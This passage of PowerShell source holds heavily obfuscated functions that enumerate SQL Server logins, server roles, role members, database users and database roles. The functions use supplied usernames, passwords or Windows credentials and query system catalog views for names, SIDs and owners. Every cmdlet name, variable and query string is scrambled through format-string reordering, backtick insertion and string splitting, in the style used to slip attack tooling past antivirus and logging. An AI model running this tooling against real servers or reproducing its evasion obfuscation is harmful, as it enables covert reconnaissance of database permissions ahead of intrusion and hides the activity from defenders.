        {
            ${t`B`LdATa`B`ASES} = &("{4}{3}{1}{0}{2}" -f'Databa','-SQL','se','t','Ge') -Instance ${iN`sTaN`ce} -Username ${US`eR`NamE} -Password ${p`ASSW`oRD} -Credential ${creDeNt`i`Al} -HasAccess -DatabaseName ${daTabasE`N`Ame} -SuppressVerbose
        }

        
        ${TBl`datABA`s`eS} |
        &("{2}{1}{0}{3}" -f 'rEac','o','F','h-Object') -Process {
            
            ${D`B`NAMe} = ${_}."d`Ataba`S`EName"

            if( -not ${SUP`presSV`eR`BOSE})
            {
                &("{4}{3}{1}{0}{2}"-f 'o','rb','se','rite-Ve','W') -Message ("$Instance "+': '+'Gra'+'bbing'+' '+'dat'+'ab'+'as'+'e '+'u'+'sers '+'from'+' '+"$DbName.")
            }

            
            ${qu`eRY} = (' '+' '+'U'+'SE '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELE'+'CT '+' '+"'$ComputerName' "+'a'+'s '+'['+'Computer'+'Name],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[In'+'sta'+'nce'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$DbName' "+'as'+' '+'[Databas'+'eN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.principa'+'l_i'+'d '+'a'+'s '+'['+'Datab'+'aseUse'+'r'+'Id],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.na'+'me '+'as'+' '+'[Databa'+'s'+'eUs'+'er],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.sid'+' '+'as'+' '+'[PrincipalS'+'id]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.nam'+'e '+'as'+' '+'[Pri'+'ncipalN'+'ame]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.t'+'ype_de'+'sc'+' '+'a'+'s '+'[Pr'+'inc'+'ipalTyp'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'defau'+'lt_schem'+'a_n'+'am'+'e,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.'+'crea'+'te_'+'dat'+'e,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.i'+'s_'+'fixed_role
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+' '+' '+' '+'[s'+'ys'+'].[da'+'tabas'+'e_principals] '+'a
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'L'+'EFT '+'JO'+'IN '+'[s'+'ys].[server'+'_'+'pr'+'i'+'nci'+'pals'+'] '+'b
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'a.'+'s'+'id '+'= '+'b.'+'s'+'id '+'W'+'HERE'+' '+'1=1'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$DatabaseUserFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")

            
            ${t`B`ldATABAs`E`U`seRS`Temp} = &("{1}{2}{0}"-f'QLQuery','G','et-S') -Instance ${i`N`STAN`CE} -Query ${Que`Ry} -Username ${UseRN`AME} -Password ${P`A`s`SWORd} -Credential ${cr`E`de`NtIal} -SuppressVerbose

            
            ${Tbl`DatAB`AsE`US`E`R`STEMp} |
            &("{3}{4}{0}{2}{1}" -f'b','ect','j','Fo','rEach-O') -Process {
                
                if(${_}."PRInC`IP`Al`SID".("{0}{2}{1}" -f'Ge','e','tTyp').Invoke() -eq [System.DBNull])
                {
                    ${S`id} = ''
                }
                else
                {
                    
                    ${NE`wSID} =   $LCS2::("{2}{0}{1}"-f 'r','ing','ToSt').Invoke(${_}."Prin`ciP`A`lSId").("{0}{2}{1}" -f'Re','ce','pla').Invoke('-','')
                    if (${ne`W`SId}."len`gtH" -le 10)
                    {
                        ${S`Id} =  (variable ("QM"+"RK")  ).VALue::("{1}{2}{0}" -f 't32','ToI','n').Invoke(${neW`s`id},16)
                    }
                    else
                    {
                        ${s`ID} = ${n`e`wsid}
                    }
                }

                
                ${Nu`lL} = ${t`BLD`A`TAb`ASeUs`erS}."r`owS"."A`DD"(
                    [string]${_}."COMp`Uterna`me",
                    [string]${_}."i`Ns`TANcE",
                    [string]${_}."DaTa`BaSE`N`AME",
                    [string]${_}."dA`TabaS`e`U`sErID",
                    [string]${_}."dATaBA`SEu`seR",
                    ${s`id},
                    [string]${_}."pRincI`palna`me",
                    [string]${_}."pr`i`NcI`P`AlTyPE",
                    [string]${_}."DEfAu`l`T`_sChema`_`NaMe",
                    [string]${_}."CReAt`E`_Date",
                [string]${_}."iS_f`IxED`_R`oLE")
            }
        }
    }

    End
    {
        
        ${t`BlD`A`TAbAS`Eu`SErS}
    }
}






Function  GEt-`S`QlsE`R`VEr`Role
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANdAToRY = ${faL`se},
        helPmEsSAGe = {"{4}{0}{5}{8}{10}{2}{7}{9}{1}{6}{3}" -f'er','t','nt ','ate with.','SQL S','v','ic','to a','er or ','uthen','domain accou'})]
        [string]${uSe`R`NA`ME},

        [Parameter(manDaToRy = ${f`Alse},
        helpMESsAGE = {"{8}{11}{0}{5}{12}{6}{9}{3}{2}{1}{7}{10}{4}"-f'in a','nt','o authe','password t','th.','cco','t','icate ','SQL S',' ','wi','erver or doma','un'})]
        [string]${P`As`sWorD},

        [Parameter(mAndATorY = ${fa`lSE},
        helPMEssAGe = {"{0}{1}{2}{3}" -f'Windo','ws ','cr','edentials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`R`EdENtI`Al} =   (  iTEM  varIAble:0459M2 ).VALUe::"EM`ptY",

        [Parameter(MaNdaTORY = ${f`A`Lse},
                ValuefROMpIpeLiNeBYproPERTYNAMe = ${tr`Ue},
        hElPmESsagE = {"{3}{8}{2}{9}{6}{0}{10}{5}{7}{4}{1}"-f't','.','stanc','SQL Server i','o','n','ec',' t','n','e to conn','io'})]
        [string]${In`sta`NCE},

        [Parameter(ManDAToRY = ${f`A`lSe},
                VAluEfROMPipeLiNEBYpRopeRtyNamE = ${tR`Ue},
        hELPmEssAgE = {"{1}{0}{2}" -f'name','Role ','.'})]
        [string]${rOlEp`R`InC`IpAL`NA`me},

        [Parameter(mAnDaToRy = ${FA`LsE},
                vAluEfromPIPeLInebyPrOpErtyNAme = ${t`RUE},
        HeLPMessage = {(("{3}{5}{4}{1}{2}{0}"-f 'me.','o','wner{0}s na','Rol',' ','e'))-F  [chAR]39})]
        [string]${r`oL`EoWnER},

        [Parameter(mAnDATOry = ${FaL`Se},
        helpmESsAgE = {"{9}{1}{7}{12}{13}{6}{15}{4}{10}{16}{5}{11}{8}{3}{14}{0}{2}" -f 'd','ppre','.','a','o','un','bose','s',' is wr','Su','r','ction','s ve','r','ppe',' err','s.  Used when f'})]
        [switch]${SUppr`ES`sveR`BoSE}
    )

    Begin
    {
        
        ${t`B`LS`ER`VeRROLes} = &("{0}{2}{3}{1}"-f'New','ct','-Ob','je') -TypeName ("{0}{1}{3}{2}{5}{4}"-f'Syst','em.Dat','taTa','a.Da','e','bl')
        ${N`ULL} = ${TblS`e`Rv`ERroLEs}."C`oLuMnS".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{2}"-f'Na','Computer','me'))
        ${n`ULl} = ${TblS`ErVERRO`L`eS}."cOlu`Mns".("{0}{1}" -f'A','dd').Invoke(("{0}{2}{1}"-f'Insta','e','nc'))
        ${Nu`ll} = ${tBLSE`RV`ErrOLEs}."COL`UmNs".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{4}{0}{3}" -f'incipa','Ro','le','lId','Pr'))
        ${nu`lL} = ${T`BLS`ERvE`Rr`oLEs}."CO`lumNs".("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{2}{0}" -f'cipalSid','P','rin','Role'))
        ${N`Ull} = ${T`BlsEr`VErro`L`ES}."cOLum`NS".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{4}{5}{0}{3}" -f'a','Role','Pri','lName','n','cip'))
        ${Nu`LL} = ${TBl`Se`RVErRoL`eS}."COLU`mnS".("{0}{1}" -f'Ad','d').Invoke(("{3}{1}{2}{0}{4}"-f 'cipalT','ePri','n','Rol','ype'))
        ${n`ULL} = ${Tb`l`SeRveRr`OLeS}."c`OluM`Ns".("{0}{1}"-f'A','dd').Invoke(("{0}{1}{4}{2}{3}"-f 'OwnerPr','inc','p','alId','i'))
        ${nU`ll} = ${tBL`Se`R`VerRolEs}."cOlU`mnS".("{1}{0}"-f'dd','A').Invoke(("{2}{4}{3}{1}{0}"-f'e','Nam','Ow','ncipal','nerPri'))
        ${nu`LL} = ${TblSER`VerRol`Es}."C`oL`Umns".("{1}{0}" -f'dd','A').Invoke(("{0}{3}{1}{2}" -f 'is_','a','bled','dis'))
        ${n`ULL} = ${TB`Ls`erver`Roles}."CoL`UMNs".("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{3}{4}{0}" -f 'le','s_','i','fixed','_ro'))
        ${N`ULL} = ${TB`L`SERv`erRoLES}."COl`UmNS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{2}"-f'create_d','a','te'))
        ${nU`Ll} = ${T`BLser`VEr`ROlEs}."cO`LU`Mns".("{0}{1}"-f 'Ad','d').Invoke(("{3}{1}{2}{0}"-f'e','odify','_Dat','m'))
        ${NU`LL} = ${T`Bl`SeR`VERroLes}."Co`L`UmnS".("{0}{1}"-f'Ad','d').Invoke(("{0}{3}{1}{2}{4}" -f'd','fault_data','base_','e','name'))

        
        if (${rOl`EO`wNer})
        {
            ${ROle`o`w`N`ERFIlTEr} = (' '+'AND'+' '+'suser_nam'+'e(own'+'i'+'ng_pri'+'nci'+'p'+'al_id)'+' '+'lik'+'e '+"'$RoleOwner'")
        }
        else
        {
            ${ROlEOWNE`RfI`lt`Er} = ''
        }

        
        if (${ROl`epr`inCIp`A`lnAMe})
        {
            ${P`Ri`NciPAlNAmEfil`TeR} = (' '+'AND'+' '+'name'+' '+'like'+' '+"'$RolePrincipalName'")
        }
        else
        {
            ${PrInC`ipalna`MEfIl`T`eR} = ''
        }
    }

    Process
    {
        

        
        ${cOM`PUt`Er`NaME} = &("{1}{4}{3}{0}{2}" -f'eFromInstanc','Ge','e','Nam','t-Computer') -Instance ${InSTAn`cE}

        
        if(-not ${IN`s`TAN`CE})
        {
            ${In`St`ANCe} = ${E`N`V`:C`O`MpUTErNaMe}
        }

        
        ${TesT`CONN`ection} = &("{3}{1}{4}{2}{5}{0}"-f 'est','SQ','nne','Get-','LCo','ctionT') -Instance ${I`N`sTAnce} -Username ${us`eRnA`me} -Password ${p`A`SsWO`Rd} -Credential ${CR`eDe`NT`iAL} -SuppressVerbose | &("{2}{1}{0}"-f 'ject','here-Ob','W') -FilterScript {
            ${_}."St`ATUs" -eq ("{0}{2}{1}" -f'Acce','ible','ss')
        }
        if(${TE`StConnE`Ct`IoN})
        {
            if( -not ${SUppR`Es`Sv`erbOSe})
            {
                &("{2}{3}{1}{0}"-f 'se','bo','W','rite-Ver') -Message ("$Instance "+': '+'Con'+'n'+'ection '+'Succ'+'es'+'s.')
            }
        }
        else
        {
            if( -not ${SU`pPR`esSVeRb`o`Se})
            {
                &("{0}{2}{3}{1}"-f'Writ','Verbose','e','-') -Message ("$Instance "+': '+'Con'+'ne'+'c'+'tion '+'F'+'ailed.')
            }
            return
        }

        
        ${Q`UeRy} = ('SE'+'LECT '+' '+' '+"'$ComputerName' "+'as'+' '+'['+'C'+'omput'+'erN'+'ame]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'['+'Insta'+'n'+'c'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pr'+'incipa'+'l_id '+'a'+'s '+'[RolePri'+'nc'+'ipa'+'lId]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'id '+'as'+' '+'[R'+'olePr'+'incip'+'al'+'Sid'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'nam'+'e '+'a'+'s '+'[R'+'o'+'lePrincipalNam'+'e]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'type_d'+'esc'+' '+'a'+'s '+'[RolePr'+'in'+'ci'+'pal'+'Ty'+'pe],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'own'+'ing_'+'pr'+'i'+'ncipal_'+'id '+'as'+' '+'['+'OwnerPr'+'i'+'nc'+'ipal'+'Id],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'user_name(own'+'ing_pr'+'inci'+'pa'+'l'+'_id'+') '+'a'+'s '+'['+'Own'+'e'+'rPrincip'+'alNa'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'s_disable'+'d,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'s_f'+'i'+'xed_role,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cr'+'eat'+'e_date,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'modi'+'fy_'+'Date'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'de'+'fault_'+'da'+'tabase_n'+'ame
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'[m'+'ast'+'er'+'].[sy'+'s].[server'+'_p'+'ri'+'nc'+'ipals] '+'W'+'HERE '+'ty'+'pe '+'li'+'ke '+(('badRb'+'ad
'+' ')  -CRepLAce  ([ChAr]98+[ChAr]97+[ChAr]100),[ChAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+"$RoleOwnerFilter")

        
        ${tBLSe`RVE`Rr`oL`estEMp} = &("{2}{0}{1}" -f'et-','SQLQuery','G') -Instance ${i`Nst`Ance} -Query ${q`UERy} -Username ${useRN`A`Me} -Password ${pASSW`O`Rd} -Credential ${cred`E`NTi`AL} -SuppressVerbose

        
        ${T`Bl`SErVErR`o`LeStEmP} |
        &("{1}{0}{2}" -f'h-Ob','ForEac','ject') -Process {
            
            ${neW`S`Id} =  $lCS2::("{2}{1}{0}" -f'ng','Stri','To').Invoke(${_}."R`OLEpr`inC`iPAlSID").("{1}{0}{2}"-f'epla','R','ce').Invoke('-','')
            if (${n`ewSId}."Le`Ng`Th" -le 10)
            {
                ${S`Id} =   ( Get-VARiablE  QMrk -vAlUeoN  )::("{1}{2}{0}"-f 't32','T','oIn').Invoke(${nEwS`ID},16)
            }
            else
            {
                ${S`ID} = ${n`E`WsiD}
            }

            
            ${nu`Ll} = ${TBLser`VE`Rr`OlES}."Ro`wS"."A`DD"(
                [string]${_}."CO`MPuteR`NAMe",
                [string]${_}."IN`sTAn`ce",
                [string]${_}."RoLE`PR`I`NCIPALiD",
                ${S`id},
                ${_}."ro`LEpRiN`CiPA`lNA`me",
                [string]${_}."rOLe`prI`Nc`I`pal`TYPe",
                [string]${_}."o`WNeRpRI`N`c`IpALid",
                [string]${_}."OwnEr`prin`cIpalnA`me",
                [string]${_}."Is_diS`A`BL`ed",
                [string]${_}."i`s_`FI`xed_rOLe",
                ${_}."cR`eatE_D`A`TE",
                ${_}."M`oDIfy_`d`ATe",
            [string]${_}."DefauL`T_DAtA`Base`_Na`mE")
        }
    }

    End
    {
        
        ${TBLs`Er`VER`Ro`Les}
    }
}






Function  g`E`T-SQlSe`RveRrolE`mEmBeR
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAndaTorY = ${FAl`SE},
        HelPmEssaGE = {"{9}{10}{1}{3}{11}{6}{5}{2}{7}{0}{8}{12}{4}"-f 'uthenti',' ','to ','or domain ','h.','unt ','co','a','cate w','SQL Serve','r','ac','it'})]
        [string]${usERn`AME},

        [Parameter(mANDAtory = ${fa`LsE},
        HelPmEssage = {"{0}{5}{4}{6}{7}{10}{11}{8}{1}{3}{9}{2}"-f 'SQL','sswor','te with.','d to au','r',' Se','ver ','or do','a','thentica','main ac','count p'})]
        [string]${pA`ssWo`RD},

        [Parameter(maNDAtOry = ${Fa`lSe},
        hELpmEssaGE = {"{0}{4}{6}{3}{5}{1}{2}"-f 'Wi','l','s.','credent','n','ia','dows '})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${crEDen`T`i`Al} =  $0459m2::"E`MpTY",

        [Parameter(MAndatoRY = ${Fa`lsE},
                VaLuefRompIPelinEbypROPeRtynAME = ${tR`Ue},
        hElPMesSage = {"{0}{3}{4}{2}{1}{6}{5}" -f'SQL','nce to connecti','sta',' Ser','ver in','to.','on '})]
        [string]${INsT`A`NCE},

        [Parameter(manDAtorY = ${FA`LSE},
                VaLUEfRompIpeLINebyproPERtYnAme = ${T`RUe},
        HELPmeSSaGE = {"{1}{2}{0}"-f 'e.','Role na','m'})]
        [string]${R`OLepRin`c`I`Pa`lNAME},

        [Parameter(mANDaTory = ${f`A`LsE},
                VaLUEFroMpiPELINebYpRoPeRTyName = ${t`Rue},
        HELpMESsagE = {"{1}{6}{4}{5}{2}{0}{3}" -f'count n','SQL','ows ac','ame.','in or Wi','nd',' log'})]
        [string]${pRIn`CiPal`N`A`Me},

        [Parameter(maNdaTOrY = ${fal`sE},
        hElpMESsaGE = {"{6}{10}{2}{9}{0}{7}{8}{5}{4}{3}{11}{1}"-f's.  ','.','ss verbose ','on is','functi','n ','Suppr','Us','ed whe','error','e',' wrapped'})]
        [switch]${s`Upp`RessvE`RboSE}
    )

    Begin
    {
        
        ${tblSerV`eR`R`O`L`EmembE`Rs} = &("{1}{0}{2}" -f '-O','New','bject') -TypeName ("{2}{1}{0}{4}{3}{5}{6}"-f'D','stem.','Sy','ta.Data','a','Tabl','e')

        
        if (${ROLEPRIN`cipa`LN`AmE})
        {
            ${RolE`oW`N`er`FILTeR} = (' '+'A'+'ND '+'S'+'USER_NAME(role'+'_prin'+'c'+'i'+'pal_id) '+'lik'+'e '+"'$RolePrincipalName'")
        }
        else
        {
            ${R`OLe`OwNEr`F`iltER} = ''
        }

        
        if (${Pr`i`N`CI`paLnAME})
        {
            ${PrINCiPALn`AM`EFILt`er} = (' '+'AN'+'D '+'SUSER'+'_NAME'+'(me'+'mber'+'_p'+'rinci'+'pa'+'l_i'+'d) '+'like'+' '+"'$PrincipalName'")
        }
        else
        {
            ${p`RI`NcIpALnaMe`FilteR} = ''
        }
    }

    Process
    {
        
        ${co`MpUte`R`NAmE} = &("{5}{6}{2}{1}{3}{0}{4}{7}"-f 't','I','ameFrom','ns','a','Get','-ComputerN','nce') -Instance ${inSt`ANCe}

        
        if(-not ${InSt`A`NCE})
        {
            ${INsTAN`CE} = ${eNV:COMput`e`R`N`AMe}
        }

        
        ${tEstCoNN`E`ct`ioN} = &("{3}{2}{0}{1}" -f'LConnectionTes','t','SQ','Get-') -Instance ${InsT`ANcE} -Username ${U`SeR`NAme} -Password ${pasS`wO`Rd} -Credential ${cRe`dE`NTiAL} -SuppressVerbose | &("{0}{2}{1}" -f 'Wh','bject','ere-O') -FilterScript {
            ${_}."STAt`US" -eq ("{0}{2}{1}" -f'Acce','le','ssib')
        }
        if(${T`Es`Tc`oNnECt`ion})
        {
            if( -not ${s`UP`pR`ESsVeRBose})
            {
                &("{1}{2}{0}" -f'e','Writ','e-Verbos') -Message ("$Instance "+': '+'Connecti'+'o'+'n '+'Succ'+'es'+'s.')
            }
        }
        else
        {
            if( -not ${suPp`R`Ess`VErBOSe})
            {
                &("{0}{1}{2}"-f'Wri','te','-Verbose') -Message ("$Instance "+': '+'C'+'on'+'nection'+' '+'Fai'+'led.')
            }
            return
        }

        
        ${Q`U`erY} = (' '+' '+'SEL'+'ECT '+' '+"'$ComputerName' "+'a'+'s '+'[C'+'omp'+'ut'+'erNa'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Ins'+'t'+'a'+'nce],'+'r'+'ol'+'e_principal'+'_id '+'as'+' '+'[R'+'oleP'+'rinci'+'palId],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SU'+'SER_NAM'+'E(rol'+'e_p'+'rin'+'ci'+'p'+'al_id) '+'as'+' '+'[Rol'+'ePr'+'in'+'cipa'+'lN'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'memb'+'er_prin'+'ci'+'pal_id '+'as'+' '+'['+'Princ'+'i'+'palId],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUSE'+'R_NAM'+'E(m'+'ember_pr'+'incipal'+'_'+'id'+') '+'a'+'s '+'[Pri'+'n'+'ci'+'pa'+'lName]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+'s'+'ys.serv'+'er_role'+'_membe'+'rs '+'WHER'+'E '+'1=1
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+"$RoleOwnerFilter")

        
        ${TB`LsERV`ERr`oLem`eMBERSTemp} = &("{2}{1}{0}" -f'Query','L','Get-SQ') -Instance ${InS`T`ANce} -Query ${qu`E`RY} -Username ${USE`RNA`ME} -Password ${PAS`SWoRD} -Credential ${cr`ED`EnTiAl} -SuppressVerbose

        
        ${tBlS`ervERr`oLE`Mem`B`erS} = ${tb`ls`ErVERrOL`EMe`mBeRS} + ${TBlSe`R`VEr`Ro`lEMeMbE`RSTEmp}
    }

    End
    {
        
        ${tblsE`RVer`R`O`l`e`MemBeRs}
    }
}







Function  gE`T-Sqld`ATaba`Ser`o`lE
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNDatORy = ${fAL`Se},
        helpMessaGE = {"{10}{11}{7}{0}{2}{1}{4}{8}{12}{5}{6}{13}{9}{3}" -f 'r',' dom','ver or','h.','ain ','uthent','i','e','a','it','SQL ','S','ccount to a','cate w'})]
        [string]${UsErn`A`ME},

        [Parameter(MaNDaTORY = ${f`ALSE},
        HElPmeSSaGe = {"{9}{0}{6}{8}{1}{3}{5}{2}{11}{4}{10}{7}" -f 'or','unt','ssword to authenti',' ','te ','pa',' domai','th.','n acco','SQL Server ','wi','ca'})]
        [string]${PA`S`sW`ORd},

        [Parameter(ManDATory = ${F`A`lsE},
        hElPmeSsAGe = {"{0}{5}{4}{2}{1}{3}"-f 'Wi','ential','s cred','s.','ow','nd'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRe`de`NtIaL} =  $0459M2::"eM`PTy",

        [Parameter(MANdATORY = ${fa`l`Se},
                ValuefROMPipeLINeBYpROpERTYNAmE = ${tR`UE},
        helPmeSsaGE = {"{4}{9}{2}{8}{0}{3}{11}{5}{6}{1}{7}{10}" -f' to','t','tanc',' c','SQL','nnect','ion ','o','e',' Server ins','.','o'})]
        [string]${INS`TAn`cE},

        [Parameter(MANdatOrY = ${Fa`LSE},
                vALueFromPipELiNebypROpERtyNAME = ${t`RUe},
        HelPmESSAge = {"{1}{0}{5}{6}{3}{2}{4}" -f 'data','SQL Server ','na',' ','me.','bas','e'})]
        [string]${dATaB`A`SEn`AMe},

        [Parameter(MANdAToRY = ${FAL`se},
                VALUefRomPIpELineBYProPeRtYnAme = ${t`RuE},
        HelpMeSSAGe = {"{0}{2}{1}"-f'R','e name.','ol'})]
        [string]${ro`L`e`pRINciPaLname},

        [Parameter(mANDaTOry = ${Fa`l`Se},
                valuefROmpIpeLInEBYpRopeRtynaME = ${t`RuE},
        HeLpmESSAge = {(("{2}{3}{0}{1}"-f ' owne','rQdls name.','Rol','e'))  -REplacE'Qdl',[CHaR]39})]
        [string]${R`oLEO`wner},

        [Parameter(MAndatoRy = ${F`AlSE},
        heLpmEssAGE = {"{5}{3}{4}{0}{7}{1}{6}{2}" -f'non de','t d','abases.','ly se','lect ','On','at','faul'})]
        [switch]${noD`EfA`UlTS},

        [Parameter(MandAtOry = ${FAl`se},
        helpMeSSaGE = {"{6}{10}{2}{5}{7}{9}{1}{3}{4}{8}{0}{11}"-f 'ed','uncti',' verbose','on is wr','a',' erro','Supp','rs.  Used ','pp','when f','ress','.'})]
        [switch]${suPp`ReSSVE`RB`Ose}
    )

    Begin
    {
        
        ${TbldAt`A`BA`s`EROles} = &("{1}{2}{0}" -f'ct','Ne','w-Obje') -TypeName ("{4}{1}{3}{0}{2}" -f'aTab','a','le','.Dat','System.Dat')
        ${Nu`Ll} = ${TB`L`D`A`TaBaSeroL`es}."c`olU`MnS".("{0}{1}" -f'A','dd').Invoke(("{2}{3}{0}{1}" -f 'pu','terName','C','om'))
        ${N`ULl} = ${tblDa`TaBAse`Rol`eS}."cO`Lum`NS".("{1}{0}" -f'dd','A').Invoke(("{1}{0}"-f'nstance','I'))
        ${nu`LL} = ${TB`ldATaB`ASE`RolES}."col`UM`Ns".("{0}{1}"-f'A','dd').Invoke(("{1}{3}{0}{2}" -f 'taba','D','seName','a'))
        ${NU`Ll} = ${T`BlD`AtAbASEr`oles}."Co`l`UmnS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{3}{2}"-f'Pri','Role','palId','nci'))
        ${Nu`lL} = ${T`BldataBas`e`ROLES}."CO`LuMNS".("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{0}{2}" -f 'cipalS','olePrin','id','R'))
        ${N`ULL} = ${TBLdAtABa`S`E`Ro`l`es}."cO`l`Umns".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}{3}" -f 'Role','ipa','Princ','lName'))
        ${n`UlL} = ${TB`lDAt`AB`ASERo`leS}."col`U`mNS".("{0}{1}"-f'A','dd').Invoke(("{2}{0}{3}{1}" -f'ncipal','e','RolePri','Typ'))
        ${n`UlL} = ${TbLdAtab`A`SE`ROL`eS}."cOlU`MNS".("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}" -f 'd','OwnerPri','ncipalI'))
        ${n`Ull} = ${t`B`l`DatabAsER`OLeS}."COl`Um`Ns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{1}{4}{3}"-f'Pr','inc','Owner','lName','ipa'))
        ${n`Ull} = ${TB`LdatAb`AsErO`leS}."c`OlUMnS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}{3}"-f'is_','f','ixed','_role'))
        ${N`Ull} = ${t`BlDaTABa`se`R`OLes}."CoLum`NS".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}{3}" -f'e_dat','crea','t','e'))
        ${NU`lL} = ${tbL`DAtAB`AsE`RoL`eS}."C`O`LumNs".("{1}{0}" -f'dd','A').Invoke(("{2}{0}{1}" -f 'od','ify_Date','m'))
        ${n`ULl} = ${Tblda`T`Aba`sEROl`ES}."COL`U`mNs".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{3}{2}{5}{4}" -f'default','_','hema','sc','ame','_n'))

        
        if (${ROl`E`own`Er})
        {
            ${rO`LEOWn`er`FILt`ER} = (' '+'AND'+' '+'suse'+'r_name(o'+'wning'+'_'+'pri'+'n'+'cipal_id)'+' '+'like'+' '+"'$RoleOwner'")
        }
        else
        {
            ${rOL`eoWner`FiL`TeR} = ''
        }

        
        if (${R`o`L`EPR`i`NCipalnaME})
        {
            ${rO`le`PRinciPal`NAME`FIlteR} = (' '+'AND'+' '+'name'+' '+'lik'+'e '+"'$RolePrincipalName'")
        }
        else
        {
            ${R`OL`eP`RINC`IpAlNAmeFi`LtER} = ''
        }
    }

    Process
    {
        
        ${c`Ompu`T`eR`Name} = &("{0}{1}{8}{7}{3}{6}{5}{4}{2}"-f'Get','-Compute','e','mIn','c','n','sta','eFro','rNam') -Instance ${inS`TaN`ce}

        
        if(-not ${iN`S`T`AnCE})
        {
            ${InS`TAn`cE} = ${eNv`:COm`PuT`ErnA`ME}
        }

        
        ${tEs`Tc`oNneC`Tion} = &("{2}{3}{5}{4}{1}{0}" -f'Test','ion','G','et-SQ','t','LConnec') -Instance ${InsTA`N`CE} -Username ${U`sErNA`ME} -Password ${pAsSw`O`RD} -Credential ${C`ReDenTi`AL} -SuppressVerbose | &("{0}{1}{2}"-f 'Where-Ob','je','ct') -FilterScript {
            ${_}."sTA`TUS" -eq ("{0}{2}{1}"-f 'Ac','ble','cessi')
        }
        if(${t`EStCO`NNec`TI`on})
        {
            if( -not ${s`UpPRESS`V`er`BOSe})
            {
                &("{2}{0}{3}{1}"-f'te-Verb','se','Wri','o') -Message ("$Instance "+': '+'Conn'+'ect'+'i'+'on '+'S'+'u'+'ccess.')
            }
        }
        else
        {
            if( -not ${sUpP`R`E`ssVe`RbosE})
            {
                &("{3}{2}{1}{0}" -f'e','os','te-Verb','Wri') -Message ("$Instance "+': '+'Conn'+'ec'+'tion '+'Fa'+'iled.')
            }
            return
        }

        
        if(${NOd`EFA`Ul`Ts})
        {
